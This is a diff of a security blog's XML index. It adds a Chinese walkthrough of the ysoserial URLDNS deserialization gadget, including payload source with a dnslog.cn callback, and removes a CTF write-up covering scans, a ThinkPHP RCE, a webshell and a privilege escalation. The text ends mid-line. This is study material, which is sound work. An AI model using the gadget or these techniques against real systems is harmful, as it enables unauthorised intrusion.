@@ -33,75 +33,85 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Jacobi_fly天翼杯2020WP</title>
-    <url>//Jacobi_fly.html</url>
-    <content><![CDATA[<p>2020年天翼杯决赛wp by <strong><code>Jacobi_fly</code></strong></p>
-<p><strong>Ps: 队友懒得上博客，让我来做，所以有幸给出我们做题的WP</strong></p>
+    <title>URLDNS 分析</title>
+    <url>//URLDNS.html</url>
+    <content><![CDATA[<p>对<code>ysoserial</code>工具中<code>URLDNS.java</code>利用链分析，跟踪调试。</p>
+<p><strong>参考p神知识星球中的文章（p神博客里也有）</strong></p>
 <a id="more"></a>
 
 
 
-<p><strong>0xDktb师傅太强了</strong></p>
-<p><strong>XZLang师傅太强了</strong></p>
-<p><strong>我是废物</strong></p>
-<img src="天翼杯2020/image-20200817214034533.png" alt="image-20200817214034533" style="zoom:50%;" />
+<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>先来看看<code>ysoserial</code>对这个gadget的注释</p>
+<h3 id="漏洞点，效果"><a href="#漏洞点，效果" class="headerlink" title="漏洞点，效果"></a>漏洞点，效果</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
 
+<p>在第二行写到触发漏洞的方法为<code>URL.hashCode()</code></p>
+<p>第三行写到，这个gadget的会产生的效果是进行一次<code>dns lookup(域名解析)</code>，这个利用链在目标<strong>能够出网的情况下</strong>可以使用。</p>
+<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>在注释里面，利用链的调用栈写的很清楚</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
 
+<p>之后调试的时候，可以在这些地方分别下断点（也可以直接在<code>URL.hashCode()</code>处下断点）然后调试分析。</p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url);</span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// write by my self</span></span><br><span class="line">            String[] command = &#123;<span class="string">&quot;http://mqfbep.dnslog.cn&quot;</span>&#125;;</span><br><span class="line">            <span class="comment">//    PayloadRunner.run(URLDNS.class, args);</span></span><br><span class="line">            PayloadRunner.run(URLDNS.class, command);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>下面差不多是按照过程整理出来的WP（大概），欢迎各位师傅交流（别骂我呜呜呜）</p>
-<h3 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/mWBlpZkSeqI2hof5.jpg!thumbnail.png" alt="img"></p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ulFQZBQ7SbvCE8Bs.jpg!thumbnail.png" alt="img"></p>
-<h3 id="flag23"><a href="#flag23" class="headerlink" title="flag23"></a>flag23</h3><p>APK 解压之后，使用**<code>字符串搜索</code>**得到flag，和域名<a href="http://ps.dasctf.wetolink.com/">http://ps.dasctf.wetolink.com</a> </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/1qsdwRHrNAwAAAgw.png!thumbnail.png" alt="图片"></p>
-<p>ping一下得到ip地址 (也可以直接nmap扫自己的ip/24)</p>
-<h3 id="Nmap-report"><a href="#Nmap-report" class="headerlink" title="Nmap report"></a>Nmap report</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.12.1 </span><br><span class="line">Host is up (0.10s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE    VERSION </span><br><span class="line">22/tcp   open     ssh        Huawei VRP sshd (protocol 1.99) </span><br><span class="line">23/tcp   filtered telnet </span><br><span class="line">80/tcp   open     http       Huawei S5700-series switch httpd </span><br><span class="line">443/tcp  open     ssl/https? </span><br><span class="line">1045/tcp filtered fpitp </span><br><span class="line">Service Info: OS: VRP; Device: switch; CPE: cpe:/o:huawei:vrp </span><br><span class="line">Nmap scan report for 192.168.12.251 </span><br><span class="line">Host is up (0.15s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line"> </span><br><span class="line">Nmap scan report for 192.168.12.252 </span><br><span class="line">Host is up (0.092s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line">Nmap scan report for ps.dasctf.wetolink.com (192.168.12.253) </span><br><span class="line">Host is up (0.081s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br></pre></td></tr></table></figure>
+<p><code>URLStreamHandler</code>还没有分析过作用，</p>
+<p>先引入p神博客上的说明</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">首先：URLStreamHandler，引用别人对这个类的理解。</span><br></pre></td></tr></table></figure>
 
-<h3 id="flag17"><a href="#flag17" class="headerlink" title="flag17"></a>flag17</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/oASq6jCeYwtsQUIF.png!thumbnail.png" alt="图片"></p>
-<h3 id="flag18"><a href="#flag18" class="headerlink" title="flag18"></a>flag18</h3><p>查看<code>robots.txt</code> ，里面有一个链接，进入之后看到是</p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/3EwJGFPP1VmIO2lu.png!thumbnail.png" alt="图片"></p>
-<p>得到flag18 </p>
-<h3 id="flag9"><a href="#flag9" class="headerlink" title="flag9"></a>flag9</h3><p>80端口登录失败给flag9 </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/maRrU72gyrotFALt.png!thumbnail.png" alt="图片"></p>
-<h3 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a>flag7</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/hKzubHKKLzdN8jYu.png!thumbnail.png" alt="图片"></p>
-<p><code>robots.txt</code> 文件直接给flag7 </p>
-<h3 id="192-168-12-253-8888目录扫描结果"><a href="#192-168-12-253-8888目录扫描结果" class="headerlink" title="192.168.12.253:8888目录扫描结果"></a>192.168.12.253:8888目录扫描结果</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[10:48:31] Starting: </span><br><span class="line">[10:48:35] 200 -    6KB - /.DS_Store </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login.html </span><br><span class="line">[10:49:12] 200 -    5KB - /Admin/login / </span><br><span class="line">[10:50:02] 200 -    0B  - /backup/ </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin/admin.asp </span><br><span class="line">[10:51:05] 200 -   18KB - /Index </span><br><span class="line">[10:51:05] 200 -   18KB - /index </span><br><span class="line">[10:51:06] 200 -   18KB - /index.html </span><br><span class="line">[10:51:06] 200 -   18KB - /index.php </span><br><span class="line">[10:51:06] 200 -    7KB - /index.php/login/ </span><br><span class="line">[10:51:24] 200 -    7KB - /login </span><br><span class="line">[10:51:24] 200 -    7KB - /Login </span><br><span class="line">[10:51:25] 200 -    7KB - /login.html </span><br><span class="line">[10:51:25] 200 -    7KB - /Login.html </span><br><span class="line">[10:51:26] 200 -    7KB - /login/ </span><br><span class="line">[10:51:26] 200 -    7KB - /login/admin/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/admin/admin.asp </span><br><span class="line">[10:51:27] 200 -    7KB - /login/administrator/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel.%2A </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel/ </span><br><span class="line">[10:51:45] 200 -    7KB - /login/index </span><br><span class="line">[10:51:45] 200 -    7KB - /login/login </span><br><span class="line">[10:51:45] 200 -    7KB - /login/oauth/ </span><br><span class="line">[10:51:46] 200 -    7KB - /login/super </span><br><span class="line">[10:52:07] 200 -    3KB - /README.md </span><br><span class="line">[10:52:09] 200 -  130B  - /robots.txt </span><br><span class="line">[10:52:31] 200 -   24KB - /register </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/autoload.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_files.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_classmap.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_namespaces.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_psr4.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_real.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_static.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/ClassLoader.php </span><br><span class="line">[10:52:41] 200 -   23KB - /vendor/composer/installed.json </span><br><span class="line">[10:52:41] 200 -    1KB - /vendor/composer/LICENSE </span><br></pre></td></tr></table></figure>
-
-<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>是一个<code>thinkphp</code>，经过测试得到版本是<code>5.0.14</code>使用kali的<code>seachsploit</code>，找到一个payload </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/S7N4aR0VTvVh7rZp.png!thumbnail.png" alt="图片"></p>
-<p>s参数是一个RCE，写入一句话木马，使用蚁剑连接，得到后门 </p>
-<h3 id="flag1-amp-amp-flag5"><a href="#flag1-amp-amp-flag5" class="headerlink" title="flag1 &amp;&amp; flag5"></a>flag1 &amp;&amp; flag5</h3><p>在<code>/home</code>目录下发现flag1和flag5，其中flag1可以直接读 </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/kf3ZiTKPfXAnEbIG.png!thumbnail.png" alt="图片"></p>
-<p>flag5需要root权限， </p>
-<p>找一下<code>setuid</code>的东西，找到一个<code>nl</code> </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/XxkZNxARcAaQfu9Z.png!thumbnail.png" alt="图片"></p>
-<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看<code>/var/www/html/application/database.php</code>，数据库配置的是内网的一台主机。 </p>
-<p>用冰蝎连接查询flag: </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/u9enAOu1xXM94wGP.png!thumbnail.png" alt="图片"></p>
-<p>或者查看<code>/proc/net/arp</code>也可以发现内网的主机。 </p>
-<h3 id="flag19"><a href="#flag19" class="headerlink" title="flag19"></a>flag19</h3><p>在80端口使用CBC字节翻转攻击的时候，解码<code>cookie</code>时发现。 </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/stkRZawsSKCozytq.jpg!thumbnail.png" alt="图片"></p>
-<h3 id="flag22"><a href="#flag22" class="headerlink" title="flag22"></a>flag22</h3><p>登录完之后，上传 <code>test.avi</code> 然后下载，之后拿到 .avi 播放，获得 flag。 </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ovsCwUxRD94gsU4e.jpg!thumbnail.png" alt="图片"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>是Jacobi_fly队伍的出道战役（以前不叫这名</p>
-<p>也是我们目前取得的最好的成绩，这里特别感谢我的队友们</p>
-<ul>
-<li><p>初赛由淘宝师傅一人carry，带着一道题没做出来的我和做了签到题的XZLang进入复赛</p>
+<p>   一般而言， URL 的格式是： protocol://[authority]hostname:port/resource?queryString 。 URL 类能够解析出 protocol、 hostname 、 port 等信息。 Protocol 决定了交互规范，通用的协议，比如 HTTP 、 File 、 FTP 等协议， JDK 自带了默认的通讯实现。当然，自定义实现是允许的。 Hostname 和 port 一般用于 Socket 或者基于 Socket 其他协议通讯方式。Resource 即资源上下文。可能读者利用 URL ，通过指定协议（ protocol ）来获取指定资源的读写，比如 JDK 内置了HTTP 、 File 、 FTP 等协议的处理方法。</p>
+<p>   在成功地构造 URL 实例之后， URL API 中定义了一个 openConnection() 方法，返回一个 java.net.URLConnection 抽象类型的实例。不过，这里 URL 对象是代理对象，实际调用的是， java.net.URLStreamHandler 对象的 openConnection() 方法。</p>
+<p>　　我觉得可以理解为URLStreamHandler handler = new SilentURLStreamHandler();是初始化一个方法，到时候你的URL实例会根据这个类方法调用不同的操作。openConnection和getHostAddress是可以自定义的，说明协议可以自定义，自定义的协议做自定义的操作</p>
+</blockquote>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><ul>
+<li><p>MacOs(10.15.7)</p>
 </li>
-<li><p>这次淘宝师傅又carry了，大多数flag都是由他交上，一人狂砍1000+分（x</p>
-</li>
-<li><p>XZLang师傅也很NB</p>
-</li>
-<li><p><font color='red'>只有我是废物呜呜呜</font></p>
+<li><p>Java(jdk 1.8)</p>
+<blockquote>
+<p>必须是 1.8 以后，因为在1.8 以前HashMap.readObject() 方法中没有调用 HashMap.putVal() 方法，触发不了gadget</p>
+</blockquote>
 </li>
 </ul>
-<p>​    </p>
+<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>每一个gadget的java类中都自带一个<code>main</code>方法，使用<code>PayloadRunner</code>执行这个payload，所以直接使用这个进行调试，在<code>PayloadRunner</code>中，有一个<code>Command</code>，即需要执行的命令。</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118102512107.png" alt="image-20201118102512107"></p>
+<p>默认的<code>command</code>是调用<code>calc.exe</code></p>
+<p>由于本gadget是不能进行命令执行，只能进行一次DNS查询，所以需要对<code>command</code>进行赋值，这里在免费的<code>http://www.dnslog.cn/</code>请求一个子域名</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118102845625.png" alt="image-20201118102845625"></p>
+<p>用这个子域名赋值<code>command</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// write by my self</span></span><br><span class="line">    String[] command = &#123;<span class="string">&quot;http://mqfbep.dnslog.cn&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// PayloadRunner.run(URLDNS.class, args);</span></span><br><span class="line">    PayloadRunner.run(URLDNS.class, command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>值得一提的是，上述<code>command</code>中的<code>http://</code>不能省略，因为在<code>getObject() -&gt; new URL()</code>的时候，会把<code>command</code>传入参数，在构造方法里，判断了协议</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = start ; !aRef &amp;&amp; (i &lt; limit) &amp;&amp;</span><br><span class="line">                     ((c = spec.charAt(i)) != <span class="string">&#x27;/&#x27;</span>) ; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;:&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">        String s = spec.substring(start, i).toLowerCase();</span><br><span class="line">        <span class="keyword">if</span> (isValidProtocol(s)) &#123;</span><br><span class="line">            newProtocol = s;</span><br><span class="line">            start = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果省略协议，则会抛出异常</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (protocol == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">&quot;no protocol: &quot;</span>+original);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p>在<code>HashMap.ReadObject()</code>处下断点，运行到<code>putVal</code>处，</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118104047928.png" alt="image-20201118104047928"></p>
+<p>跟进<code>hash(key)</code>方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>key.hashCode()</code>会调用<code>URL.hashCode()</code>方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后会调用<code>handler.hashCode(this)</code>，这个<code>handler</code>是一个<code>URLStreamHandler</code>类对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">   ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到<code>getHostAddress()</code>，这个函数中</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    String host = u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">            ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用了一个<code>InetAddress.getByName(host)</code>方法，顾名思义，这个方法是发起一次DNS请求，解析目标域名。</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118105831277.png" alt="image-20201118105831277"></p>
+<p>到这里，这个利用链已经调试结束，利用链不长。</p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ul>
+<li>这个利用链只有<code>dns请求</code>，可以用作检测目标是否存在反序列化漏洞。</li>
+</ul>
 ]]></content>
       <categories>
-        <category>CTF</category>
-        <category>天翼杯</category>
+        <category>JavaWeb</category>
+        <category>ysoserial</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
+        <tag>JavaWeb</tag>
+        <tag>ysoserial</tag>
       </tags>
   </entry>
   <entry>
@@ -179,88 +189,6 @@
 <h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>暂时由于环境问题还没调试，之后分析（</p>
 <h2 id="版本限制"><a href="#版本限制" class="headerlink" title="版本限制"></a>版本限制</h2><p>在调试的过程中可以发现，如果jdk版本过高，反序列化后<code>LazyMap</code>对象会被解释成一个<code>LinkedHashMap</code>对象，使得上面的gadget无法被利用。</p>
 <h2 id="另一种方法"><a href="#另一种方法" class="headerlink" title="另一种方法"></a>另一种方法</h2><p>不只是<code>LazyMap</code>可以触发上述点，在<code>TransformedMap</code>中也有类似的操作，有待之后分析。</p>
-]]></content>
-      <categories>
-        <category>JavaWeb</category>
-        <category>ysoserial</category>
-      </categories>
-      <tags>
-        <tag>JavaWeb</tag>
-        <tag>ysoserial</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>URLDNS 分析</title>
-    <url>//URLDNS.html</url>
-    <content><![CDATA[<p>对<code>ysoserial</code>工具中<code>URLDNS.java</code>利用链分析，跟踪调试。</p>
-<p><strong>参考p神知识星球中的文章（p神博客里也有）</strong></p>
-<a id="more"></a>
-
-
-
-<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>先来看看<code>ysoserial</code>对这个gadget的注释</p>
-<h3 id="漏洞点，效果"><a href="#漏洞点，效果" class="headerlink" title="漏洞点，效果"></a>漏洞点，效果</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
-
-<p>在第二行写到触发漏洞的方法为<code>URL.hashCode()</code></p>
-<p>第三行写到，这个gadget的会产生的效果是进行一次<code>dns lookup(域名解析)</code>，这个利用链在目标<strong>能够出网的情况下</strong>可以使用。</p>
-<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>在注释里面，利用链的调用栈写的很清楚</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
-
-<p>之后调试的时候，可以在这些地方分别下断点（也可以直接在<code>URL.hashCode()</code>处下断点）然后调试分析。</p>
-<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url);</span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// write by my self</span></span><br><span class="line">            String[] command = &#123;<span class="string">&quot;http://mqfbep.dnslog.cn&quot;</span>&#125;;</span><br><span class="line">            <span class="comment">//    PayloadRunner.run(URLDNS.class, args);</span></span><br><span class="line">            PayloadRunner.run(URLDNS.class, command);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span 